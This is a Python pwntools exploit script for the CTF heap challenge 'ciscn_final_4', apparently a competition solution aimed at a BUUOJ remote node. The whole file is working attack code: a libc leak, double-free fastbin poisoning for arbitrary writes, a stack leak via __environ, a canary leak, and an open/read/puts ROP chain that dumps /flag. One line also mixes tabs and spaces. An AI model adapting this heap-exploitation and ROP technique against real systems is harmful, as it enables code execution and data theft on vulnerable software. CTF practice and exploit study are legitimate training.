#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/19 19:13:54
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    if context.arch == "amd64":
        sh = process(['./ciscn_final_4'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
        libc = ELF("/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so")
        # sh = process('./ciscn_final_4')
        # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    else:
        # sh = process(['./'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so'})
	sh = process('./ciscn_final_4')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
else:
    IP = 'node4.buuoj.cn'
    port = 25196
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]

def debug():
    gdb.attach(sh)
    pause()
elf = ELF('ciscn_final_4')

def cmd(choice):
    sh.recvuntil(">> ")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("size?\n")
    sh.sendline(str(size))
    sh.recvuntil("content?\n")
    sh.sendline(content)

def dele(idx):
    cmd(2)
    sh.recvuntil("index ?\n")
    sh.sendline(str(idx))

def show(idx):
    cmd(3)
    sh.recvuntil("index ?")
    sh.sendline(str(idx))
sh.recvuntil("what is your name? \n")
sh.sendline("a"*0xe8 + p64(0) + p64(0x81))
# gdb.attach(sh,"b *0x400C2A")
heap_size_addr = 0x602040
flag_addr = 0x602060
flag_write_addr = 0x602040
add(0x80,"aaaa") #0
add(0x81,"aaaa") #1
add(0x70,"aaaa") #2
add(0x70,"aaaa") #3
add(0,"") #4
add(0,"") #5
add(0x81,"aaaa") #6
dele(0)
show(0)
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b78
log.info("libc_base=>{}".format(hex(libc_base))) 
pop_rdi_ret = libc_base + 0x0000000000021102
pop_rsi_ret = libc_base + 0x00000000000202e8
pop_rdx_ret = libc_base + 0x0000000000001b92
environ_addr = libc_base + libc.symbols['__environ']
open_addr = libc_base + libc.symbols['openat']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']
puts_addr = libc_base + libc.symbols['puts']
log.info("pop_rdi_ret=>{}".format(hex(pop_rdi_ret)))
log.info("pop_rsi_ret=>{}".format(hex(pop_rsi_ret)))
log.info("pop_rdx_ret=>{}".format(hex(pop_rdx_ret)))
log.info("read_addr=>{}".format(hex(read_addr)))
log.info("puts_addr=>{}".format(hex(puts_addr)))
log.info("openat_addr=>{}".format(hex(open_addr)))
log.info("environ_addr=>{}".format(hex(environ_addr)))
# openat(0,flag,0)
ROPchain = p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0) + p64(open_addr)
# read(3,flag_addr,0x30)
ROPchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_write_addr) + p64(pop_rdx_ret) + p64(0x30) + p64(read_addr)
# puts(flag)
ROPchain += p64(pop_rdi_ret) + p64(flag_write_addr) + p64(puts_addr)
# write(1,flag_write_addr,0x30)
# ROPchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(flag_write_addr) + p64(pop_rdx_ret) + p64(0x30) + p64(write_addr)
dele(2)
dele(3)
dele(2)
add(0,"") #7
add(0,"") #8
add(0,"") #9
add(0x70,p64(heap_size_addr+0x10)) #10
add(0x70,"") #11
add(0x70,"") #12
payload = "/flag\x00\x00\x00"
payload += p64(0)*11 + p64(environ_addr)
add(0x70,payload) #13
show(0)
stack_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
log.info("stack_addr=>{}".format(hex(stack_addr)))
fake_chunk_addr = stack_addr - 0x120
log.info("fake_chunk_addr=>{}".format(hex(fake_chunk_addr)))
add(0x70,"aaaa") #14
add(0x70,"aaaa") #15
add(0x70,"aaaa") #16
dele(10)
dele(11)
dele(10)
add(0x70,p64(fake_chunk_addr)) #17
add(0x70,"aaaa") #18
add(0x70,"aaaa") #19
add(0x78,"a"*0x10) #20
show(20)
sh.recvuntil("a"*0x10+"\n")
canary = u64(sh.recv(7).rjust(8,"\x00"))
log.info("canary=>{}".format(hex(canary)))
fake_chunk2_addr = stack_addr - 0x263
add(0x60,"aaaa") #21
add(0x60,"aaaa") #22
dele(21)
dele(22)
dele(21)
add(0x60,p64(fake_chunk2_addr)) #23
add(0x60,"aaaa") #24
add(0x60,"aaaa") #25
# debug()
payload = '\x00' * 0x3 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) +p64(stack_addr-0x208) + p64(pop_rdx_ret) + p64(0x100) + p64(read_addr)
# debug()
add(0x60,payload)
sh.send(ROPchain)
sh.interactive()